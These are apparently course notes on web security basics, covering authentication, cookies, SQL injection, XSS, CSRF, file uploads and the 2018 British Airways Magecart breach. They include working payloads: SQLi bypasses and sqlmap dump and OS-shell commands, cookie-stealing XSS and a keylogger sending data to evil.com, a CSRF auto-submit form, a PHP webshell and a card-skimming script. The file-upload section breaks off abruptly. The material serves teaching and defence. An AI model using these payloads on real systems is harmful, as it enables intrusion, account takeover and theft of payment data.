Topic 109

Web Security Basics

🌐
⚡ One-Line Summary
Web security protects web apps from attacks that exploit flaws in code, authentication, or configuration — covering client, server, and communication layers.

Definition & Architecture

Definition
Web security encompasses the measures taken to protect web applications and their users from attacks that exploit vulnerabilities in client-side code, server-side logic, databases, APIs, authentication, and communication channels. With 75% of cyberattacks targeting web applications, it is the most active battleground in cybersecurity.

Topic 110

Authentication vs Authorization

🔑
⚡ One-Line Summary
Authentication = WHO are you (identity); Authorization = WHAT can you do (permissions). Both must be correctly implemented or attackers bypass access controls.

Core Distinction

AUTHN vs AUTHZ
Authentication (AuthN): "Are you who you claim to be?"
  → Verifying identity: passwords, MFA, certificates, biometrics
  → Happens FIRST
  → Failure: "Login failed - wrong password"

Authorization (AuthZ): "Are you allowed to do this?"
  → Access control: roles, permissions, ACLs
  → Happens AFTER authentication
  → Failure: "Access denied - insufficient permissions"

Real example:
  You log into your bank app         ← Authentication
  You can only see YOUR accounts     ← Authorization
  You cannot see other customers'    ← Authorization control

Common Mistakes:
  → Broken Authentication: weak passwords, no MFA, session fixation
  → Broken Authorization: can access other users' data (IDOR),
    admin functions accessible to regular users (privilege escalation)

Authentication Methods

MethodDescriptionStrengthAttack
Password (something you know)Classic username + passwordMediumBrute force, phishing, credential stuffing
OTP / TOTP (time-based)6-digit code every 30 seconds (Google Auth)GoodReal-time phishing (Evilginx), SIM swap
SMS OTPCode sent via text messageMediumSIM swap, SS7 interception
Hardware Key (FIDO2)Physical device (YubiKey) — cryptographic challengeExcellentPhysical theft only — phishing-proof
Passkeys (WebAuthn)Device-bound key pair — biometric unlockExcellentDevice compromise only

Authorization Vulnerabilities

AUTHORIZATION BYPASS EXAMPLES
# ── Broken vertical access control (privilege escalation) ──
# Admin function accessible to regular user:
GET /admin/users/delete?id=5   ← No admin role check! Any logged-in user can call this

# ── Horizontal access control bypass (IDOR) ──
# Changing ID to access other users' data:
GET /account?user_id=1001    ← Your account
GET /account?user_id=1002    ← Another user's account (no check if 1002 = you!)

# ── Force browsing ──
# Skipping authentication by directly accessing protected page:
GET /dashboard  ← If no server-side session check, serves page anyway!

# ── JWT role manipulation ──
# JWT payload (base64 decoded):
{"sub":"alice","role":"user","exp":1715000000}
# Attacker changes role:
{"sub":"alice","role":"admin","exp":1715000000}
# If signature not verified → gets admin access!

# ── Testing with Burp Suite Repeater ──
# 1. Log in as User A, capture request to /my-profile
# 2. Log in as User B in different browser session
# 3. Send User A's request in Burp Repeater using User B's session cookie
# 4. Can User B access User A's profile? → Broken authorization!
🔬 Exercise
  1. List three differences between authentication failures and authorization failures. Give a real-world example of each.
  2. Why is JWT role-based authorization dangerous if the server doesn't verify the signature? Use the "algorithm=none" attack as an example.
📌 Conclusion

Authentication and authorization failures are consistently the most exploited web vulnerabilities. Authentication says who you are; authorization says what you can access. Every security decision must enforce both, server-side, for every request — never trust client-supplied identity or role claims.

Topics 111–112

Session Management & Cookies Security

🍪
⚡ One-Line Summary
Sessions maintain state across stateless HTTP; cookies store session tokens — both must be secured with proper flags, timeouts, and unpredictable IDs or attackers impersonate users.

Session Lifecycle

User logs in with credentials
Server validates credentials → creates session in DB
Server sends: Set-Cookie: session=RANDOM_TOKEN; HttpOnly; Secure; SameSite=Strict
Browser sends cookie with every request to that domain
Server looks up session in DB → knows who you are
On logout: server DELETES session from DB (not just cookie)

Session Attacks & Defences

AttackHow It WorksPrevention
Session FixationAttacker sets victim's session ID before login; after login, attacker uses same IDRegenerate session ID on login
Session HijackingSteal valid session cookie via XSS, sniffing, or MitMHttpOnly, Secure flags; short timeouts; bind to IP/UA
Session PredictionPredictable/sequential session IDs; attacker guesses next valid IDUse cryptographically random IDs (128+ bits)
CSRFForce authenticated user's browser to make requests to the appCSRF tokens + SameSite=Strict
Session Timeout BypassReuse expired session if server doesn't check expiryServer-side timeout; absolute + idle timeouts

Cookie Security Flags — Deep Dive

COOKIE SECURITY FLAGS
# ── Insecure cookie (all flags missing) ──
Set-Cookie: session=abc123
# JS can read it → XSS steals cookie: document.cookie
# Sent over HTTP → MitM can intercept
# Sent cross-site → CSRF possible

# ── Fully hardened cookie ──
Set-Cookie: session=RANDOM256BITHEX; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

HttpOnly     → JS CANNOT read this cookie (document.cookie returns "")
              Prevents XSS cookie theft completely
              ALWAYS set on session cookies

Secure       → Cookie ONLY sent over HTTPS connections
              Prevents MitM interception on HTTP
              ALWAYS set in production

SameSite=Strict  → Cookie NOT sent on cross-site requests at all
              Prevents CSRF completely
              May break some OAuth flows (use Lax for those)

SameSite=Lax     → Sent on same-site + top-level GET navigations
              Default in modern browsers if not specified
              Protects from CSRF POST attacks

SameSite=None; Secure  → Required for cross-site cookies (3rd party)
              e.g. embedded payment widgets, OAuth

Max-Age=3600  → Session expires after 1 hour (absolute expiry)
Path=/        → Cookie sent for all paths on domain
Domain        → Don't set (limits to exact domain, not subdomains)

# ── Steal cookie via XSS (without HttpOnly) ──
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
# With HttpOnly set: document.cookie = "" → cannot steal!

# ── Check cookies with Burp Suite ──
# Proxy tab → Intercept login response
# Look at Set-Cookie header → verify all flags present
# Cookie jar: Target → Site Map → right-click → Cookie jar
🔬 Exercise
  1. Using browser DevTools (F12 → Application → Cookies), inspect the cookies on a website you use. Do they have HttpOnly, Secure, and SameSite flags set?
  2. Explain session fixation: how does the attacker set the victim's session ID? At what point should the server regenerate the session ID?
📌 Conclusion

Session management and cookie security are inseparable. Always use cryptographically random session IDs (128+ bits), set all three security flags (HttpOnly+Secure+SameSite=Strict), implement server-side timeouts, and regenerate session ID on login. A stolen session cookie grants complete account access without knowing the password.

Topic 113

SQL Injection

CRITICAL💉
⚡ One-Line Summary
SQLi inserts malicious SQL into user input to manipulate database queries — allowing attackers to extract, modify, or delete data, or bypass authentication entirely.

Definition & Types

Definition
SQL Injection (SQLi) occurs when user-supplied input is inserted directly into an SQL query without proper sanitisation, allowing an attacker to alter the query's logic. It is consistently OWASP #1 or #3 — the most impactful web vulnerability affecting databases.

SQLi Types — Full Deep Dive

SQL INJECTION — COMPLETE ATTACK GUIDE
━━━ TYPE 1: IN-BAND SQLi (Error-based + Union-based) ━━━━━━━━━━━━

# Vulnerable PHP code:
$query = "SELECT * FROM users WHERE username='$_POST[user]' AND password='$_POST[pass]'";

# Authentication bypass (classic):
Username: admin'--
Password: anything
# Query becomes:
# SELECT * FROM users WHERE username='admin'--' AND password='anything'
# '--' comments out password check → logs in as admin!

# Alternative bypasses:
admin' OR '1'='1'--       # Always true → login as first user
admin'/*                   # MySQL block comment
' OR 1=1#                 # MySQL hash comment
'; DROP TABLE users;--    # Classic SQL injection (Bobby Tables!)

# UNION-based: Extract data from other tables
# Step 1: Find number of columns
GET /products?id=1 ORDER BY 1--  # Works
GET /products?id=1 ORDER BY 2--  # Works
GET /products?id=1 ORDER BY 3--  # Error! → 2 columns exist

# Step 2: UNION to extract passwords
GET /products?id=-1 UNION SELECT username,password FROM users--
# Response shows usernames and passwords!

━━━ TYPE 2: BLIND SQLi (Boolean + Time-based) ━━━━━━━━━━━━━━━━━
# No data returned — infer from true/false responses or time delays

# Boolean-based (different response for true/false):
GET /user?id=1 AND 1=1--     # Normal response (true)
GET /user?id=1 AND 1=2--     # Different/empty response (false)
# Bit by bit, extract database contents!
GET /user?id=1 AND SUBSTRING(username,1,1)='a'--  # First char = 'a'?

# Time-based (no visual difference — use timing):
GET /user?id=1; IF(1=1,SLEEP(5),0)--     # 5 second delay = TRUE
GET /user?id=1; IF(1=2,SLEEP(5),0)--     # Instant = FALSE

━━━ SQLMAP — AUTOMATED SQLi TOOL ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://target.com/item?id=1"             # Basic test
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://target.com/item?id=1" --dbs       # List databases
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://target.com/item?id=1" -D shop --tables
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://target.com/item?id=1" -D shop -T users --dump
Database: shop
Table: users
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | (MD5: "password")
| 2  | alice    | e10adc3949ba59abbe56e057f20f883e |
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://target.com/item?id=1" --os-shell  # Get OS shell (if permissions allow!)

⚔️ SQLi Techniques

  • ' OR '1'='1'-- auth bypass
  • UNION SELECT to extract other tables
  • SLEEP(5) for blind time-based
  • LOAD_FILE() to read server files
  • INTO OUTFILE to write files (webshell!)
  • sqlmap --os-shell for RCE

🛡️ SQLi Defences

  • Parameterised queries / Prepared Statements (primary!)
  • Stored procedures with input binding
  • ORM frameworks (Hibernate, SQLAlchemy)
  • Input validation + whitelist
  • Least privilege DB user (no DROP permission)
  • WAF as additional layer (not sole defence)

Parameterised Queries — The Fix

PARAMETERISED QUERIES
# ── VULNERABLE (string concatenation) ──
$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "'";
# User inputs: admin'-- → query broken!

# ── SECURE (parameterised) ──
# PHP PDO:
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['user']]);  // Input treated as DATA, never as SQL

# Python (sqlite3):
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# Java (PreparedStatement):
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);  // '1' binds to first ? — never interpreted as SQL

# Node.js (mysql2):
db.query("SELECT * FROM users WHERE username = ?", [username], callback);

# WHY it works: the parameter is sent separately to the DB engine
# The DB KNOWS it's data, not SQL — it cannot break out of the parameter boundary

  1. Use DVWA (Damn Vulnerable Web App) at low security. Try the SQL injection challenge. Extract the admin password hash using UNION SELECT.
  2. Run sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs. What databases exist?
  3. Why does a parameterised query prevent SQL injection even when the input contains ' OR '1'='1?
📌 Conclusion

SQL injection has caused some of the largest data breaches in history. The fix is simple: always use parameterised queries — every language and framework supports them. There is no excuse for SQLi in 2024. A single parameterised query template replaces hundreds of input validation rules.

Topic 114

Cross-Site Scripting (XSS)

CRITICAL📜
⚡ One-Line Summary
XSS injects malicious JavaScript into web pages — running in victims' browsers to steal cookies, redirect users, log keystrokes, or perform actions on their behalf.

XSS Types — Complete Breakdown

XSS TYPES — ATTACK + TEST PAYLOADS
━━━ TYPE 1: REFLECTED XSS (Non-persistent) ━━━━━━━━━━━━━━━━━━━━
# Input reflected immediately in response, not stored
# Attacker sends victim a crafted URL

# Vulnerable URL:
https://site.com/search?q=<script>alert('XSS')</script>
# Server reflects: "Results for: <script>alert('XSS')</script>"
# Browser executes script — alert box pops!

# Real attack — steal session cookie:
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

━━━ TYPE 2: STORED XSS (Persistent) — Most Dangerous ━━━━━━━━━━
# Malicious script stored in database, served to all visitors
# E.g., comment section, forum post, profile name

# Attacker posts this as a comment:
Nice article! <script>fetch('https://evil.com/c?k='+document.cookie)</script>
# Every user who views the page has their cookie stolen!

━━━ TYPE 3: DOM-BASED XSS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Payload executed by client-side JavaScript, never touches server
# Vulnerable JS code:
document.getElementById('msg').innerHTML = location.hash.substring(1);
# URL: https://site.com/page#<img src=x onerror=alert(1)>
# hash value injected into innerHTML → executes!

━━━ XSS PAYLOAD EXAMPLES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<script>alert('XSS')</script>                   # Basic test
<img src=x onerror=alert(document.domain)>         # Image error event
<svg/onload=alert(1)>                              # SVG event
"><script>alert(1)</script>                       # Break out of attribute
javascript:alert(1)                                # In href attribute
<iframe src="javascript:alert(1)">                 # iframe src
'><svg onload=alert`1`>                           # Template literal (CSP bypass)

# Advanced: Keylogger via XSS
<script>
document.addEventListener('keypress', function(e){
  fetch('https://evil.com/keys?k='+e.key);
});
</script>

# BeEF (Browser Exploitation Framework) — XSS command and control:
<script src="http://attacker:3000/hook.js"></script>
# Victim's browser becomes a zombie — attacker can take screenshots,
# redirect browser, scan network, steal credentials via fake popups

━━━ XSS TESTING WITH TOOLS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┌──(kali㉿kali)-[~]
└─$ dalfox url "https://target.com/search?q=test"  # XSS scanner
┌──(kali㉿kali)-[~]
└─$ xsser -u "https://target.com/search?q=" -p XSS
# In Burp Suite: use XSS payloads in Intruder attack on input fields

⚔️ XSS Capabilities

  • Steal session cookies → account takeover
  • Keylogger → capture passwords as typed
  • Screenshot browser tab
  • Redirect to phishing site
  • Cryptomining in victim's browser
  • Port scan victim's internal network (via fetch)

🛡️ XSS Defences

  • Output encoding: HTML entities for all user data
  • Content Security Policy (CSP) header
  • HttpOnly cookies (stops cookie theft)
  • DOM API: textContent not innerHTML
  • Input validation + sanitisation (DOMPurify)
  • Trusted Types API (modern browsers)
🔬 Exercise
  1. On DVWA (XSS-Reflected, low security), inject <script>alert(document.cookie)</script>. Can you see your session cookie? Now set HttpOnly on the cookie — can you still steal it?
  2. What is the difference between innerHTML and textContent in JavaScript? Which is safer and why?
  3. Write a CSP header that would prevent all external scripts while allowing inline event handlers. Then explain why inline event handlers in CSP are dangerous.
📌 Conclusion

XSS is the most common web vulnerability. Stored XSS is particularly dangerous — a single injection can steal cookies from every visitor. The primary defences are output encoding (context-aware) and a strict CSP header. The combination of HttpOnly cookies + strong CSP eliminates most XSS impact.

Topic 115

CSRF — Cross-Site Request Forgery

HIGH🎣
⚡ One-Line Summary
CSRF tricks an authenticated user's browser into making unwanted requests to a trusted site — the browser auto-sends cookies, so the server thinks the action is legitimate.

CSRF Attack — Step by Step

CSRF ATTACK WALKTHROUGH
# SCENARIO: Victim is logged into their bank at bank.com
# The bank has a vulnerable money transfer endpoint:
POST /transfer
Body: to=attacker&amount=10000
# Server processes this if the request has a valid session cookie
# The browser ALWAYS sends session cookie for bank.com automatically!

━━━ ATTACK ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Attacker hosts evil.com with hidden form:
<html>
<body onload="document.csrf.submit()">
  <form name="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>

# Attacker sends victim a link to evil.com
# Victim's browser (logged into bank.com) visits evil.com
# evil.com auto-submits form to bank.com
# Browser automatically includes bank.com session cookie!
# Bank sees valid session + transfer request → transfers money!
# Victim has no idea this happened.

# GET-based CSRF (even simpler):
<img src="https://bank.com/transfer?to=attacker&amount=10000">
# Just loading evil.com triggers the bank transfer!

━━━ CSRF TOKEN DEFENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Server generates random CSRF token per session, embeds in form:
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="RANDOM_UNGUESSABLE_TOKEN">
  ...
</form>

# Server validates token on submit — attacker cannot know this token!
# Same-origin policy prevents evil.com reading bank.com's HTML
# → attacker cannot extract the CSRF token

# SameSite=Strict also prevents CSRF (cookie not sent cross-site):
Set-Cookie: session=abc; SameSite=Strict

# Double Submit Cookie pattern:
# - Server sets CSRF cookie + CSRF hidden field with same random value
# - JS reads cookie, sets form field (works because attacker can't read cookies)
# - Server compares both values
🔬 Exercise
  1. Why can't an attacker just read the CSRF token from the victim's page to include it in the forged request?
  2. Explain why SameSite=Strict prevents CSRF. What happens if you set SameSite=None — is CSRF now possible?
📌 Conclusion

CSRF exploits the fact that browsers automatically send credentials (cookies) with every request to a domain. Defence: CSRF tokens (the server validates a secret the attacker cannot know) + SameSite=Strict cookies. Modern browsers defaulting to SameSite=Lax have significantly reduced CSRF prevalence.

Topic 116

File Upload Vulnerability

CRITICAL📁
⚡ One-Line Summary
Unrestricted file uploads let attackers upload malicious files (PHP webshells, polyglots, malware) to execute arbitrary code on the server — the most direct path to Remote Code Execution (RCE).

File Upload Attack Chain

FILE UPLOAD RCE — ATTACK + BYPASS TECHNIQUES
━━━ BASIC WEBSHELL UPLOAD ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Simple PHP webshell (one-liner):
<?php system($_GET['cmd']); ?>
# Save as: shell.php
# Upload to vulnerable site
# Visit: https://target.com/uploads/shell.php?cmd=id
# Response: uid=33(www-data) gid=33(www-data) — RCE!

# More advanced webshell:
<?php echo shell_exec($_POST['cmd']); ?>

━━━ BYPASS TECHNIQUES (when filtering exists) ━━━━━━━━━━━━━━━━━
# Client-side filtering bypass:
1. Intercept with Burp Suite
2. Change filename: shell.jpg → shell.php AFTER upload bypass

Case Study: British Airways Breach 2018

✈️
⚡ One-Line Summary
Attackers injected 22 lines of malicious JavaScript into British Airways' booking page — a Magecart supply chain XSS attack that skimmed 500,000 customers' payment card details in real-time for 15 days.

The Magecart Attack on British Airways

BA BREACH 2018 — ATTACK CHAIN
Timeline: Aug 21 – Sep 5, 2018 (15 days)
Victims:  500,000 customers' card details + personal data
GDPR Fine: £183 million (later reduced to £20 million)
Attack:   Magecart supply chain JavaScript injection

STEP 1: Initial Compromise
  → Attackers compromised third-party script hosted by BA
  → Specifically: a Modernizr library loaded by ba.com
  → (Exact entry point still debated — likely insider or supplier compromise)

STEP 2: Script Injection
  → Attackers injected 22 lines of malicious JS into the payment script
  → Only active on /make-payment page (stealth!)

STEP 3: The Malicious Code
// Injected Magecart JavaScript (simplified):
var formData = {
  name: document.querySelector('[name=name]').value,
  cardNumber: document.querySelector('[name=cardnumber]').value,
  cvv: document.querySelector('[name=cvv2]').value,
  expiry: document.querySelector('[name=expirymonth]').value + '/' +
          document.querySelector('[name=expiryyear]').value,
  email: document.querySelector('[name=email]').value
};
fetch('https://baways.com/gateway', {  // ← attacker's domain (baways.com vs ba.com!)
  method: 'POST',
  body: JSON.stringify(formData)
});

# Attacker registered baways.com — similar to ba.com
# HTTPS certificate obtained from Let's Encrypt (so it had a padlock!)
# 500,000 card details exfiltrated in real-time as customers typed

STEP 4: Not Detected for 15 Days
  → No CSP to block scripts from baways.com
  → No Subresource Integrity (SRI) on loaded scripts
  → No real-time monitoring of page script changes
  → Detected by RiskIQ threat intelligence (external company)

WHAT WOULD HAVE PREVENTED IT:
  1. Content Security Policy: script-src 'self' cdn.ba.com; → blocked baways.com
  2. Subresource Integrity: <script src="lib.js" integrity="sha256-HASH">
     → script tampered = browser refuses to load
  3. Real-time monitoring of JavaScript assets
  4. Third-party vendor security auditing
  5. CSP violation reporting → would have detected day 1

  1. How would a strict CSP header have prevented the BA breach? Write the specific CSP header value needed.
  2. What is Subresource Integrity (SRI)? Write the HTML tag for loading jQuery with SRI protection.
📌 Conclusion

The BA breach was preventable with a 1-line CSP header. £183 million GDPR fine for 22 lines of attacker JavaScript — the most expensive web vulnerability in history per line of attack code. It proved that third-party scripts are a massive attack surface and that CSP + SRI are essential for any payment processing page.
